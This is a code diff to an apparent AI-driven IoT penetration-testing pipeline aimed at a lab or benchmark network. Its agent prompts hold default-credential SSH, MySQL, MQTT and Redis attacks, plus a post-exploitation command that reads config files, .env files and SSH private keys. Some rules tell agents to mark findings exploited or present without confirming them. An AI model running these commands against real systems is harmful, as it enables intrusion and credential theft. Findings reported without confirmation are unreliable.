@@ -32,6 +32,8 @@ from src.agent.tools.graph_tools import (
     get_attack_surface,
     get_risk_scores,
     get_device_info,
+    init_weighted_graph,
+    trigger_disbalance_on_exploit,
 )
 from src.agent.tools.recon_tools import RECON_TOOLS
 from src.agent.tools.deliverable import DELIVERABLE_TOOLS, set_output_dir, set_expected_deliverable, _extract_json
@@ -69,94 +71,94 @@ from src.agent.vuln_taxonomy import (
     is_noise,
 )
 
-EXPLOIT_INSTRUCTIONS: dict[str, str] = {
-    "credentials": (
-        "Test default credentials on this service. Match the tool to the SERVICE type.\n\n"
-        "For SSH (port 22) — try these pairs in order, stop at FIRST successful login:\n"
-        "  1. ssh_login(\"sshpass -p admin ssh -o StrictHostKeyChecking=no "
-        "-o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 "
-        "-o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc admin@{ip} 'id'\")\n"
-        "  2. ssh_login(\"sshpass -p root ssh -o StrictHostKeyChecking=no "
-        "-o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 "
-        "-o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc root@{ip} 'id'\")\n"
-        "  3. ssh_login(\"sshpass -p ubnt ssh -o StrictHostKeyChecking=no "
-        "-o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 "
-        "-o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc ubnt@{ip} 'id'\")\n"
-        "  4. ssh_login(\"sshpass -p raspberry ssh -o StrictHostKeyChecking=no "
-        "-o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 "
-        "-o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc pi@{ip} 'id'\")\n\n"
-        "If ANY login succeeds (return_code=0), run a SINGLE post-exploitation command:\n"
-        "  ssh_login(\"sshpass -p PASSWORD ssh -o StrictHostKeyChecking=no "
-        "-o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 "
-        "-o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc USER@{ip} "
-        "'echo === IDENTITY === && id && "
-        "echo === CREDENTIALS === && "
-        "(cat /etc/iot/config.json 2>/dev/null || echo no-config) && "
-        "(cat /home/*/.env 2>/dev/null || echo no-env) && "
-        "echo === SSH_KEYS === && "
-        "(ls -la ~/.ssh/ 2>/dev/null && cat ~/.ssh/id_rsa 2>/dev/null || echo no-ssh-keys) && "
-        "echo === NETWORK === && "
-        "(ip addr show 2>/dev/null || ifconfig 2>/dev/null) && "
-        "echo === PRIVESC === && "
-        "(sudo -l 2>/dev/null || echo no-sudo) && "
-        "(find / -perm -4000 -type f 2>/dev/null | head -5 || echo no-suid)'\")\n\n"
-        "For MySQL — try root with empty password:\n"
-        "  mysql_query(host=\"{ip}\", user=\"root\", "
-        "query=\"SHOW DATABASES; SELECT * FROM smartcity.users LIMIT 5;\")\n\n"
-        "Report ALL data retrieved in data_extracted field.\n\n"
-        "For MySQL/MariaDB (port 3306) — try root with empty password:\n"
-        "  mysql_query(host=\"{ip}\", user=\"root\", "
-        "query=\"SHOW DATABASES; SELECT * FROM information_schema.tables LIMIT 5;\")\n\n"
-        "For MQTT (port 1883) — test weak credentials (use Phase 3 evidence for hints):\n"
-        "  mqtt_listen(broker=\"{ip}\", topic=\"#\", count=5, timeout=5, username=\"test\", password=\"test\")\n"
-        "  If that fails (return_code=5), try: username=\"admin\", password=\"admin\"\n"
-        "  If that fails, try: username=\"mqtt\", password=\"mqtt\"\n\n"
-        "For SNMP (port 161) — test default community strings:\n"
-        "  nmap_scan(target=\"{ip}\", ports=\"161\", scripts=\"snmp-brute\", "
-        "skip_discovery=True, udp_scan=True)\n\n"
-        "For Redis (port 6379) — Redis rarely has credentials by default:\n"
-        "  redis_cmd(host=\"{ip}\", command=\"KEYS *\")\n"
-        "  If that works, extract sensitive keys: redis_cmd(host=\"{ip}\", command=\"GET config:db_password\")\n"
-    ),
-    "data_access": (
-        "Access the service and retrieve actual data to prove impact. "
-        "Match the tool to the SERVICE type from Phase 3 evidence.\n\n"
-        "IMPORTANT: The Phase 3 evidence already contains the exact URLs/paths to use. "
-        "Read the evidence field and use those EXACT URLs — do NOT invent paths.\n\n"
-        "For MQTT no_auth (port 1883): mqtt_listen(broker=\"{ip}\", topic=\"#\", count=10, timeout=8) "
-        "— capture messages, extract credentials/keys\n"
-        "For HTTP data_exposure: http_get(URL) using URLs from Phase 3 evidence. "
-        "If evidence mentions /backup/file.sql, use http_get(\"http://{ip}/backup/file.sql\")\n"
-        "For HTTP directory_listing: http_get(base_url) first to confirm, then http_get(listed_file_url) "
-        "for each listed file\n"
-        "For Telnet (port 23): telnet_connect(\"echo quit | timeout 3 nc {ip} 23\") — show session\n"
-        "For MySQL/MariaDB (port 3306): mysql_query(host=\"{ip}\", user=\"root\", "
-        "query=\"SHOW DATABASES;\") — show data\n"
-        "For FTP (port 21): ftp_list(\"ftp://{ip}/\") then ftp_list(\"ftp://{ip}/config/\") — show files\n"
-        "For Redis (port 6379): redis_cmd(host=\"{ip}\", command=\"KEYS *\") "
-        "then redis_cmd(host=\"{ip}\", command=\"GET config:db_password\") — dump sensitive keys\n"
-        "For Node-RED (port 1880): http_get(\"http://{ip}:1880/admin\") then "
-        "http_get(\"http://{ip}:1880/flows\") — confirm unauthenticated access\n"
-        "For CoAP (port 5683): nmap_scan(target=\"{ip}\", ports=\"5683\", "
-        "skip_discovery=True, udp_scan=True) — confirm port open\n"
-        "For misconfiguration/insecure_protocol: use the tool that matches the service in evidence\n\n"
-        "If the URL from evidence returns 404, mark as EXPLOITED anyway if Phase 3 already "
-        "captured the sensitive content — do NOT mark as FAILED when Phase 3 proved the exposure."
-    ),
-    "injection": (
-        "Attempt code execution or unauthorized upload/firmware access.\n\n"
-        "For file upload (web_upload role, port 80): "
-        "http_get(\"http://{ip}/uploads/\") to check for uploaded files, "
-        "then http_get(\"http://{ip}/\") to confirm upload endpoint exists\n"
-        "For firmware update without signature (iot_gateway, port 80): "
-        "http_get(\"http://{ip}/firmware/\") to list firmware files, "
-        "then http_get(\"http://{ip}/update\") to test update endpoint\n"
-        "For Node-RED RCE (nodered_server, port 1880): "
-        "http_get(\"http://{ip}:1880/flows\") to access flow definitions\n"
-        "For web API RCE (web_server_v2, port 80): "
-        "http_get(\"http://{ip}/api/exec\") then check if POST returns uid=0\n\n"
-        "Report what is accessible and whether code execution is possible."
-    ),
+EXPLOIT_INSTRUCTIONS: dict[str, dict[str, str]] = {
+    "credentials": {
+        "ssh": (
+            "Test default credentials on this service.\n"
+            "For SSH (port 22) — try these pairs in order, stop at FIRST successful login:\n"
+            "  1. ssh_login(\"sshpass -p admin ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc admin@{ip} 'id'\")\n"
+            "  2. ssh_login(\"sshpass -p root ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc root@{ip} 'id'\")\n"
+            "  3. ssh_login(\"sshpass -p ubnt ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc ubnt@{ip} 'id'\")\n"
+            "  4. ssh_login(\"sshpass -p raspberry ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc pi@{ip} 'id'\")\n\n"
+            "If ANY login succeeds (return_code=0), run a SINGLE post-exploitation command:\n"
+            "  ssh_login(\"sshpass -p PASSWORD ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc USER@{ip} 'echo === IDENTITY === && id && echo === CREDENTIALS === && (cat /etc/iot/config.json 2>/dev/null || echo no-config) && (cat /home/*/.env 2>/dev/null || echo no-env) && echo === SSH_KEYS === && (ls -la ~/.ssh/ 2>/dev/null && cat ~/.ssh/id_rsa 2>/dev/null || echo no-ssh-keys) && echo === NETWORK === && (ip addr show 2>/dev/null || ifconfig 2>/dev/null) && echo === PRIVESC === && (sudo -l 2>/dev/null || echo no-sudo) && (find / -perm -4000 -type f 2>/dev/null | head -5 || echo no-suid)'\")\n"
+        ),
+        "mysql": (
+            "Test default credentials on this service.\n"
+            "For MySQL/MariaDB (port 3306) — try root with empty password:\n"
+            "  mysql_query(host=\"{ip}\", user=\"root\", query=\"SHOW DATABASES; SELECT * FROM information_schema.tables LIMIT 5;\")\n"
+            "Report ALL data retrieved in data_extracted field.\n"
+        ),
+        "mqtt": (
+            "Test default credentials on this service.\n"
+            "For MQTT (port 1883) — test weak credentials (use Phase 3 evidence for hints):\n"
+            "  mqtt_listen(broker=\"{ip}\", topic=\"#\", count=5, timeout=5, username=\"test\", password=\"test\")\n"
+            "  If that fails (return_code=5), try: username=\"admin\", password=\"admin\"\n"
+            "  If that fails, try: username=\"mqtt\", password=\"mqtt\"\n"
+        ),
+        "snmp": (
+            "Test default credentials on this service.\n"
+            "For SNMP (port 161) — test default community strings:\n"
+            "  nmap_scan(target=\"{ip}\", ports=\"161\", scripts=\"snmp-brute\", skip_discovery=True, udp_scan=True)\n"
+        ),
+        "redis": (
+            "Test default credentials on this service.\n"
+            "For Redis (port 6379) — Redis rarely has credentials by default:\n"
+            "  redis_cmd(host=\"{ip}\", command=\"KEYS *\")\n"
+            "  If that works, extract sensitive keys: redis_cmd(host=\"{ip}\", command=\"GET config:db_password\")\n"
+        ),
+        "default": "Test default credentials on this service. Use appropriate tools based on the Phase 3 evidence.\n"
+    },
+    "data_access": {
+        "mqtt": "For MQTT no_auth (port 1883): mqtt_listen(broker=\"{ip}\", topic=\"#\", count=10, timeout=8) — capture messages, extract credentials/keys\n",
+        "http": "For HTTP data_exposure: http_get(URL) using URLs from Phase 3 evidence. If evidence mentions /backup/file.sql, use http_get(\"http://{ip}/backup/file.sql\")\nFor HTTP directory_listing: http_get(base_url) first to confirm, then http_get(listed_file_url) for each listed file\nIf the URL from evidence returns 404, mark as EXPLOITED anyway if Phase 3 already captured the sensitive content — do NOT mark as FAILED when Phase 3 proved the exposure.",
+        "telnet": "For Telnet (port 23): telnet_connect(\"echo quit | timeout 3 nc {ip} 23\") — show session\n",
+        "mysql": "For MySQL/MariaDB (port 3306): mysql_query(host=\"{ip}\", user=\"root\", query=\"SHOW DATABASES;\") — show data\n",
+        "ftp": "For FTP (port 21): ftp_list(\"ftp://{ip}/\") then ftp_list(\"ftp://{ip}/config/\") — show files\n",
+        "redis": "For Redis (port 6379): redis_cmd(host=\"{ip}\", command=\"KEYS *\") then redis_cmd(host=\"{ip}\", command=\"GET config:db_password\") — dump sensitive keys\n",
+        "nodered": "For Node-RED (port 1880): http_get(\"http://{ip}:1880/admin\") then http_get(\"http://{ip}:1880/flows\") — confirm unauthenticated access\n",
+        "coap": "For CoAP (port 5683): nmap_scan(target=\"{ip}\", ports=\"5683\", skip_discovery=True, udp_scan=True) — confirm port open\n",
+        "default": "Access the service and retrieve actual data to prove impact. Use the tool that matches the service in evidence. If the URL from evidence returns 404, mark as EXPLOITED anyway if Phase 3 already captured the sensitive content — do NOT mark as FAILED when Phase 3 proved the exposure."
+    },
+    "injection": {
+        "http": (
+            "Attempt code execution or unauthorized upload/firmware access.\n"
+            "For file upload (web_upload role, port 80): http_get(\"http://{ip}/uploads/\") to check for uploaded files, then http_get(\"http://{ip}/\") to confirm upload endpoint exists\n"
+            "For firmware update without signature (iot_gateway, port 80): http_get(\"http://{ip}/firmware/\") to list firmware files, then http_get(\"http://{ip}/update\") to test update endpoint\n"
+            "For web API RCE (web_server_v2, port 80): http_get(\"http://{ip}/api/exec\") then check if POST returns uid=0\n"
+            "Report what is accessible and whether code execution is possible."
+        ),
+        "nodered": (
+            "Attempt code execution or unauthorized upload/firmware access.\n"
+            "For Node-RED RCE (nodered_server, port 1880): http_get(\"http://{ip}:1880/flows\") to access flow definitions\n"
+            "Report what is accessible and whether code execution is possible."
+        ),
+        "default": "Attempt code execution or unauthorized upload/firmware access. Report what is accessible and whether code execution is possible."
+    }
+}
+
+
+ROLE_SPECIFIC_RULES: dict[str, str] = {
+    "ssh_server": "- **ssh_server / ssh_server_v2**: Check for weak SSH ciphers (ssh-audit output), banner leaking OS version. Default credentials (admin:admin) are HIGH, not CRITICAL. World-readable SSH keys in scan evidence → misconfiguration HIGH. If the device role is a jumphost or VPN gateway and AllowTcpForwarding is not explicitly disabled → misconfiguration HIGH (unrestricted SSH tunnel to other network zones possible, especially dangerous in VLAN-segmented architectures where the tunnel bypasses firewall FORWARD rules).",
+    "ssh_server_v2": "- **ssh_server / ssh_server_v2**: Check for weak SSH ciphers (ssh-audit output), banner leaking OS version. Default credentials (admin:admin) are HIGH, not CRITICAL. World-readable SSH keys in scan evidence → misconfiguration HIGH. If the device role is a jumphost or VPN gateway and AllowTcpForwarding is not explicitly disabled → misconfiguration HIGH (unrestricted SSH tunnel to other network zones possible, especially dangerous in VLAN-segmented architectures where the tunnel bypasses firewall FORWARD rules).",
+    "nvr_server": "- **nvr_server**: Test ubnt:ubnt credentials → default_credentials HIGH. SSH port open → always add default_credentials finding.",
+    "nodered_server": "- **nodered_server**: Port 1880 accessible → ALWAYS report TWO findings: (1) no_auth CRITICAL — full flow editor exposed; (2) code_injection CRITICAL — exec nodes accessible = RCE via POST /api/exec. Do NOT wait for HTTP confirmation — port 1880 open on nodered_server means both vulns are present. If /api/exec is confirmed in scan evidence, mark both as confirmed.",
+    "camera_server": "- **camera_server**: HTTP admin accessible without auth → no_auth HIGH. Check /admin, /snapshot, /stream paths — if any returns HTTP 200 without an auth challenge, report no_auth HIGH. ONVIF discovery (port 80 + /onvif/device_service) → default_credentials HIGH (ubnt:ubnt or admin:admin common). RTSP stream on port 554 without auth → data_exposure MEDIUM.",
+    "mqtt_broker": "- **mqtt_broker / mqtt_broker_v2**: Anonymous subscribe success → no_auth HIGH. Credentials in messages → data_exposure MEDIUM. $SYS topics → info_disclosure LOW.",
+    "mqtt_broker_v2": "- **mqtt_broker / mqtt_broker_v2**: Anonymous subscribe success → no_auth HIGH. Credentials in messages → data_exposure MEDIUM. $SYS topics → info_disclosure LOW.",
+    "ftp_server": "- **ftp_server**: Anonymous login confirmed → insecure_protocol HIGH. Sensitive files listed → data_exposure MEDIUM.",
+    "snmp_server": "- **snmp_server**: Community 'public' accepted → default_credentials HIGH. ALWAYS also add info_disclosure LOW — SNMP accessible without auth exposes sysLocation, sysContact, sysDescr by construction (no MIB walk evidence required).",
+    "ldap_server": "- **ldap_server**: Port 389/tcp open → ALWAYS report weak_cipher MEDIUM (LDAP without TLS = credentials in cleartext). If anonymous bind returns entries (ldap-search nmap script output) → also report no_auth MEDIUM (anonymous read access to directory). Entries containing `userPassword` → data_exposure HIGH.",
+    "coap_server": "- **coap_server**: Port 5683/udp open → ALWAYS report no_auth MEDIUM (CoAP has no built-in authentication). The absence of DTLS means traffic is in cleartext — add also weak_cipher MEDIUM if UDP is confirmed reachable. In VLAN-segmented networks, UDP 5683 may bypass iptables FORWARD rules that only drop TCP — mention this in `details` as a firewall bypass vector (the router's misconfiguration is the root cause, not this device).",
+    "db_server": "- **db_server (MySQL/MariaDB)**: Root without password AND port 3306 open/network-accessible → default_credentials CRITICAL (unauthenticated full database access from network). ONLY if nmap mysql scan results confirm port 3306 in scan output — do NOT infer MySQL from HTTP responses. Do NOT report bind-address=0.0.0.0 as a misconfiguration — it is not a standalone vulnerability.",
+    "db_server_v2": "- **db_server_v2 (Redis)**: Port 6379 open without requirepass → no_auth HIGH. Sensitive keys in Redis → data_exposure MEDIUM. If the scan shows stored keys (KEYS * output), always add data_exposure MEDIUM in addition to no_auth.",
+    "modbus_server": "- **modbus_server**: Port 502/tcp open → no_auth CRITICAL (Modbus has no auth by design). Also note: unit ID 1 accessible, read/write coils and holding registers without credentials — data exchanged in cleartext.",
+    "iot_gateway": "- **iot_gateway / gateway**: Check (1) nginx HTTP admin accessible at /admin or /api/devices without auth → no_auth HIGH (topology disclosure = CRITICAL if OT IPs are exposed in the response); (2) Dropbear SSH running — check for CVE-2023-48795 Terrapin (weak_cipher HIGH) if version < 2020.82; (3) OTA firmware endpoint at /firmware/firmware.bin accessible → data_exposure LOW. Do NOT report insecure_update unless the endpoint actively accepts firmware uploads (POST /upload or /firmware). HTTP 200 on /firmware/firmware.bin → data_exposure LOW (specific file accessible, NOT directory_listing). directory_listing requires 'Index of' in the response body. Do NOT report directory_listing unless the scanner explicitly found 'Index of'. Do NOT report insecure_update — that type is reserved for devices with an active OTA update mechanism that is unsigned. A downloadable firmware binary is data_exposure, not insecure_update.",
+    "web_server": "- **web_server / web_server_v2**: Directory listing confirmed → directory_listing MEDIUM. /api/exec accessible → code_injection CRITICAL. /api/users accessible without auth → no_auth CRITICAL. If /api/exec is accessible, report ONE finding only: code_injection CRITICAL — do NOT also add a separate no_auth for the same endpoint. If both /api/exec and /api/users are open, report code_injection (for exec) + no_auth (for users) as two distinct findings on distinct services/paths.",
+    "web_server_v2": "- **web_server / web_server_v2**: Directory listing confirmed → directory_listing MEDIUM. /api/exec accessible → code_injection CRITICAL. /api/users accessible without auth → no_auth CRITICAL. If /api/exec is accessible, report ONE finding only: code_injection CRITICAL — do NOT also add a separate no_auth for the same endpoint. If both /api/exec and /api/users are open, report code_injection (for exec) + no_auth (for users) as two distinct findings on distinct services/paths.",
+    "web_upload": "- **web_upload**: The upload endpoint is at POST /upload (not /firmware/, not /update). If scan shows HTTP 200 on root or /upload → code_injection CRITICAL. Use type `code_injection`, NOT `file_upload_endpoint` (that is a noise type). Do NOT add directory_listing — these devices don't have index pages.",
+    "gateway": "- **gateway / iot_gateway**: HTTP 200 on /firmware/firmware.bin → data_exposure LOW (specific file accessible, NOT directory_listing). directory_listing requires 'Index of' in the response body. Do NOT report directory_listing unless the scanner explicitly found 'Index of'. Do NOT report insecure_update — that type is reserved for devices with an active OTA update mechanism that is unsigned. A downloadable firmware binary is data_exposure, not insecure_update.",
+    "router": "- **router**: Telnet open → insecure_protocol MEDIUM. LuCI admin accessible → no_auth CRITICAL."
 }
 
 
@@ -285,9 +287,13 @@ class Pipeline:
             from src.agent.tools.graph_tools import _scenario_topology as _st_post
             _subnets = (_st_post or {}).get("subnets", [BENCHMARK_SUBNET])
             target_subnet = " ".join(_subnets) if len(_subnets) > 1 else (_subnets[0] if _subnets else BENCHMARK_SUBNET)
+            # Initialize weighted attack graph for disbalance computation
+            init_weighted_graph()
         else:
             lab = load_lab_context()
             target_subnet = PHYSICAL_SUBNET
+            # Initialize weighted attack graph for disbalance computation
+            init_weighted_graph()
         self.context = {
             "device_count": str(lab["device_count"]),
             "link_count": str(lab["link_count"]),
@@ -1187,6 +1193,8 @@ class Pipeline:
             surface = self._discover_attack_surface(self.target_network, stream_callback)
             from src.agent.tools.graph_tools import update_discovery_hosts
             update_discovery_hosts(surface)
+            # Initialize weighted graph for disbalance computation
+            init_weighted_graph()
 
         if self.dry_run:
             log.info("Dry run: skipping Phase 3a scanner")
@@ -1244,9 +1252,9 @@ class Pipeline:
             variables["device_os"] = device_os
             variables["expected_deliverable"] = deliverable_file
             set_expected_deliverable(deliverable_file)
-            variables["scan_results"] = json.dumps(scan_for_prompt, indent=2, ensure_ascii=False)
+            variables["scan_results"] = json.dumps(scan_for_prompt, separators=(',', ':'), ensure_ascii=False)
             variables["trivial_findings"] = json.dumps(
-                scan_data.get("findings", []), indent=2, ensure_ascii=False
+                scan_data.get("findings", []), separators=(',', ':'), ensure_ascii=False
             )
 
             # Inject network position context so the agent can reason about lateral movement
@@ -1265,6 +1273,10 @@ class Pipeline:
             variables["network_neighbors_upstream"] = upstream_str
             variables["network_neighbors_downstream"] = downstream_str
             variables["network_role"] = nbrs["role"]
+            variables["role_specific_rules"] = ROLE_SPECIFIC_RULES.get(
+                device_role, 
+                "- No specific priority rules defined for this role. Follow general best practices."
+            )
 
             system_prompt = load_prompt("analyze_device", variables)
 
@@ -1622,7 +1634,9 @@ class Pipeline:
             deliverable_file = str(_exploit_relpath(device_id, vuln_type, vuln_id))
 
             # Build exploit instructions with variable substitution
-            instructions = EXPLOIT_INSTRUCTIONS.get(category, "")
+            cat_instructions = EXPLOIT_INSTRUCTIONS.get(category, {})
+            service_key = "http" if service == "https" else service
+            instructions = cat_instructions.get(service_key, cat_instructions.get("default", ""))
             instructions = instructions.replace("{ip}", device_ip)
             instructions = instructions.replace("{port}", str(port))
             # Build URL for data_access category
@@ -1726,6 +1740,21 @@ class Pipeline:
                     "description": "Exploit agent failed to produce output",
                 }
                 deliverable_path.write_text(json.dumps(error_result, indent=2), encoding="utf-8")
+
+            # Trigger local disbalance computation after exploit
+            if deliverable_path.exists():
+                try:
+                    result_data = json.loads(deliverable_path.read_text(encoding="utf-8"))
+                    exploit_status = result_data.get("status", "")
+                    if exploit_status.upper() in ("CONFIRMED", "EXPLOITED", "COMPROMISED"):
+                        trigger_disbalance_on_exploit(
+                            device_id=device_id,
+                            exploit_status=exploit_status,
+                            vuln_type=vuln_type,
+                            device_ip=device_ip,
+                        )
+                except (json.JSONDecodeError, OSError):
+                    pass  # Non-fatal: disbalance is informational
 
         # Launch exploit agents with small stagger to avoid API rate limits
         def _run_with_stagger(args):
@@ -2066,89 +2095,42 @@ class Pipeline:
     # Phase 5 — Intrusion context + post-processing
     # ------------------------------------------------------------------
 
-    @staticmethod
-    def _repair_deliverable_json(text: str):
-        """Best-effort recovery of a model-produced JSON deliverable that fails
-        strict parsing. Handles the common LLM failures: markdown code fences,
-        control characters, invalid backslash escapes (shell commands such as
-        grep 'pass\\|pwd' produce an invalid \\| escape), and trailing data after
-        the root object. Returns a dict, or None if nothing usable is found.
-        """
-        import re as _re
-        if not text or not text.strip():
-            return None
-        t = text.strip()
-        if t.startswith("```"):
-            t = _re.sub(r"^```[a-zA-Z]*\n?|\n?```$", "", t).strip()
-        t = _re.sub(r"[\x00-\x08\x0b\x0c\x0e-\x1f]", "", t)         # control chars
-        t = _re.sub(r'\\(?!["\\/bfnrtu])', r'\\\\', t)             # invalid \escapes
-        decoder = json.JSONDecoder()
-        candidates = [t]
-        brace = t.find("{")
-        if brace > 0:
-            candidates.append(t[brace:])
-        for cand in candidates:
-            try:
-                obj, _end = decoder.raw_decode(cand)   # ignores trailing data
-                if isinstance(obj, dict):
-                    return obj
-            except Exception:
-                continue
-        return None
-
     def _ensure_intrusion_deliverable(self, config, results: dict, stream_callback=None) -> None:
         """Guarantee a valid 05_intrusion.json exists after Phase 5.
 
-        Recovery order, best to worst:
-        1. The agent saved valid JSON → keep it.
-        2. The agent saved RICH but malformed JSON (the common case: unescaped
-           shell backslashes, trailing data) → repair and keep the model's own
-           findings — they are richer than any reconstruction.
-        3. The agent saved nothing usable → reconstruct from tool_calls.jsonl.
-
-        On recovery, re-emit a phase_done event so the UI reflects the repaired
-        status instead of the agent's transient failure.
+        Small local models (e.g. gemma) frequently run the whole campaign via
+        tool calls but never call save_deliverable. When the deliverable is
+        missing or invalid, reconstruct it from tool_calls.jsonl so Phase 6 has
+        real data instead of nothing. On success, re-emit a phase_done event so
+        the UI reflects the recovered status instead of the agent's failure.
         """
         path = self.run_dir / config.deliverable_file
-
-        def _emit(status: str) -> None:
-            results[config.name] = status
-            if stream_callback:
-                stream_callback({
-                    "type": "phase_done", "phase": config.phase, "name": config.name,
-                    "status": status, "deliverable": config.deliverable_file,
-                    "cost_usd": 0, "turns": 0,
-                })
-
         validator_fn = VALIDATORS.get(config.validator, VALIDATORS["default"])
         if path.exists():
             valid, _ = validator_fn(config.deliverable_file)
             if valid:
                 return
-            # Try to salvage the model's own (richer) output before discarding it.
-            repaired = self._repair_deliverable_json(
-                path.read_text(encoding="utf-8", errors="replace")
-            )
-            if repaired and (repaired.get("compromised_devices") or repaired.get("summary")):
-                path.write_text(
-                    json.dumps(repaired, indent=2, ensure_ascii=False), encoding="utf-8"
-                )
-                n_dev = len(repaired.get("compromised_devices", []))
-                print(f"  Repaired model's intrusion deliverable — kept model output ({n_dev} devices)")
-                _emit("completed:repaired")
-                return
-
         log.warning(
             "Phase 5: deliverable missing/invalid — synthesizing from tool calls"
         )
         data = self._synthesize_intrusion_from_tools()
         path.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
+        results[config.name] = "completed:synthesized"
         print(
             f"  Synthesized intrusion deliverable from tool calls "
             f"({data['summary']['devices_compromised']} compromised, "
             f"{data['summary']['credentials_harvested']} creds)"
         )
-        _emit("completed:synthesized")
+        if stream_callback:
+            stream_callback({
+                "type": "phase_done",
+                "phase": config.phase,
+                "name": config.name,
+                "status": "completed:synthesized",
+                "deliverable": config.deliverable_file,
+                "cost_usd": 0,
+                "turns": 0,
+            })
 
     def _synthesize_intrusion_from_tools(self) -> dict:
         """Reconstruct an intrusion deliverable from logged try_credential /
